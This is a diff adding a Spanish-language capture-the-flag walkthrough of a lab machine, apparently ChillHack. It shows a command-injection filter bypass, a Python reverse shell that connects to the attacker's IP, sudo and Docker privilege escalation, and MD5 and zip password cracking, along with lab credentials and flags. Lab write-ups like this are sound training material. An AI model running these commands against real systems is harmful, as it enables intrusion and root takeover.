@@ -109,3 +109,291 @@ Finished
 ````
 Lo que más me llama la atención es el /secret vamos dentro para ver que hay:
 ![Imagen Panel](../imagenes/imagen_comandos.png)
+
+Pero que sucede cuando hacemos otro comando?
+![Imagen Panel](../imagenes/comando_fallido.png)
+
+Ahora vamos a intentar meter yn payload para poder ejecutar comandos, a ver si podemos saltarnos restricciones:
+yo he usado esta web: 
+ [https://techbrunch.github.io/patt-mkdocs/Command%20Injection/#bypass-characters-filter-via-hex-encoding](https://techbrunch.github.io/patt-mkdocs/Command%20Injection/#bypass-characters-filter-via-hex-encoding)
+ 
+En la seccion: Bypass with $@
+Entonces he usado una shell con bash:
+````python
+py$@thon3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.9.3.53",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
+````
+Y me pongo con esucha por el puerto 4444
+````
+nc -lvnp 4444
+````
+````
+┌──(kali㉿kali)-[~/Downloads/ChillHack]
+└─$ nc -lvnp 4444 
+listening on [any] 4444 ...
+connect to [10.9.3.53] from (UNKNOWN) [10.10.102.234] 39970
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ip-10-10-102-234:/var/www/html/secret$
+````
+## Escalada de privilegios 
+Relizamos un sudo -l para ver que tenemos: 
+````bash
+www-data@ip-10-10-102-234:/var/www/html/secret$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on ip-10-10-102-234:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-10-102-234:
+    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
+www-data@ip-10-10-102-234:/var/www/html/secret$
+````
+entonces ejecutamos sudo -u /home/apaar/.helpline.sh y ya seriamos apaar
+
+Yo he usado esta forma pero hay muchas más:
+````
+www-data@ip-10-10-102-234:/home/apaar$ sudo -u apaar ./.helpline.sh
+sudo -u apaar ./.helpline.sh
+
+Welcome to helpdesk. Feel free to talk to anyone at any time!
+
+Enter the person whom you want to talk with: /bin/sh
+/bin/sh
+Hello user! I am /bin/sh,  Please enter your message: /bin/sh
+/bin/sh
+whoami
+apaar
+````
+despues consola mejorada en python: 
+````
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+apaar@ip-10-10-102-234:~$
+````
+## Task 1
+1. user.txt
+````
+apaar@ip-10-10-102-234:~$ cat local.txt
+cat local.txt
+{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
+````
+## Escalada a root
+Vamos a /var/www/files ya que había un login en la web y a lo mejor podemos encontrar algo interesante, abriendo index.php hay un connect sale el password de root para una base de datos, que no hemos listado antes, será un docker.
+
+Entramos con las credenciales:
+
+````
+apaar@ip-10-10-102-234:/var/www/files$ mysql -u root -p
+mysql -u root -p
+Enter password: !@m+her00+@db
+````
+````
+show databases;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'show databases' at line 2
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| webportal          |
++--------------------+
+````
+La que más me llama la atención es webportal vamos a entrar y mostrar las tablas:
+`````aql
+mysql> use webportal;
+use webportal;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++---------------------+
+| Tables_in_webportal |
++---------------------+
+| users               |
++---------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
+select * from users;
++----+-----------+----------+-----------+----------------------------------+
+| id | firstname | lastname | username  | password                         |
++----+-----------+----------+-----------+----------------------------------+
+|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
+|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
++----+-----------+----------+-----------+----------------------------------+
+2 rows in set (0.00 sec)
+
+``````
+Encontramos muchas cosas interesantes como los passwords hasehados vamos a pasarlos por crackstation: 
+````
+7e53614ced3640d5de23f111806cc4fd	md5	masterpassword
+686216240e5af30df0501e53c789a649	md5	dontaskdonttell
+````
+Y encontramos los passwords  pero al hacer su aurick no funciona, a lo mejor ese password lo ha suado en otro sitio:
+voy a segui buscanodo por files:
+Y encuentro esto: 
+````
+
+apaar@ip-10-10-102-234:/var/www/files$ cat hacker.php
+cat hacker.php
+<html>
+<head>
+<body>
+<style>
+body {
+  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
+}
+h2
+{
+        color:red;
+        font-weight: bold;
+}
+h1
+{
+        color: yellow;
+        font-weight: bold;
+}
+</style>
+<center>
+        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
+        <h1 style="background-color:red;">You have reached this far. </h2>
+        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
+</center>
+</head>
+</html>
+apaar@ip-10-10-102-234:/var/www/files$
+````
+Lo cual me llama la atención ya que hay una url y la imagen es muy estaña voy a ver metadastos:
+````
+apaar@ip-10-10-102-234:/var/www/files/images$ ls
+ls
+002d7e638fb463fb7a266f5ffc7ac47d.gif  hacker-with-laptop_23-2147985341.jpg
+apaar@ip-10-10-102-234:/var/www/files/images$
+````
+Y nos la pasamos con python para pasarnos el archvio para usar la herramienta 
+````
+steghide -sf extract hacker-with-laptop_23-2147985341.jpg
+````
+con password nulo y encontramos backup.zip contiene contraseña vamos a usar fcrackzip:
+
+````
+fcrackzip -u -D -p /home/kali/Downloads/rockyou.txt backup.zip
+
+
+PASSWORD FOUND!!!!: pw == pass1word
+````
+Dentro de este encntramos un php con una contraseña en base 64:
+````php
+$ cat source_code.php 
+<html>
+<head>
+        Admin Portal
+</head>
+        <title> Site Under Development ... </title>
+        <body>
+                <form method="POST">
+                        Username: <input type="text" name="name" placeholder="username"><br><br>
+                        Email: <input type="email" name="email" placeholder="email"><br><br>
+                        Password: <input type="password" name="password" placeholder="password">
+                        <input type="submit" name="submit" value="Submit"> 
+                </form>
+<?php
+        if(isset($_POST['submit']))
+        {
+                $email = $_POST["email"];
+                $password = $_POST["password"];
+                if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
+                { 
+                        $random = rand(1000,9999);?><br><br><br>
+                        <form method="POST">
+                                Enter the OTP: <input type="number" name="otp">
+                                <input type="submit" name="submitOtp" value="Submit">
+                        </form>
+                <?php   mail($email,"OTP for authentication",$random);
+                        if(isset($_POST["submitOtp"]))
+                                {
+                                        $otp = $_POST["otp"];
+                                        if($otp == $random)
+                                        {
+                                                echo "Welcome Anurodh!";
+                                                header("Location: authenticated.php");
+                                        }
+                                        else
+                                        {
+                                                echo "Invalid OTP";
+                                        }
+                                }
+                }
+                else
+                {
+                        echo "Invalid Username or Password";
+                }
+        }
+?>
+</html>
+````
+Despues de pasarlo por cyberchef vamos a ver si la contraseña esta vez es correcta::
+````
+su anurodh
+Password: !d0ntKn0wmYp@ssw0rd
+whoami
+anurodh
+````
+efectivamente ahora solo queda escalas a root:
+Haciendo un id me he dado cuenta de que somos máximos privilegiados de este, entonces en GTFObins he hecho una shell para escalar este 
+````
+anurodh@ip-10-10-102-234:/var/www/html/secret$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+<docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# whoami
+whoami
+root
+````
+````
+# cat proof.txt
+cat proof.txt
+
+
+                                        {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
+
+
+Congratulations! You have successfully completed the challenge.
+
+
+         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
+,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
+|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
+|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
+ \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
+ | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
+  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
+  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
+  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  
+
+
+--------------------------------------------Designed By -------------------------------------------------------
+                                        |  Anurodh Acharya |
+                                        ---------------------
+
+                                     Let me know if you liked it.
+
+Twitter
+        - @acharya_anurodh
+Linkedin
+        - www.linkedin.com/in/anurodh-acharya-b1937116a
+
+````
+Y ya tenemos su flag
+
+
+
+
+
+
+
+
+
+ 
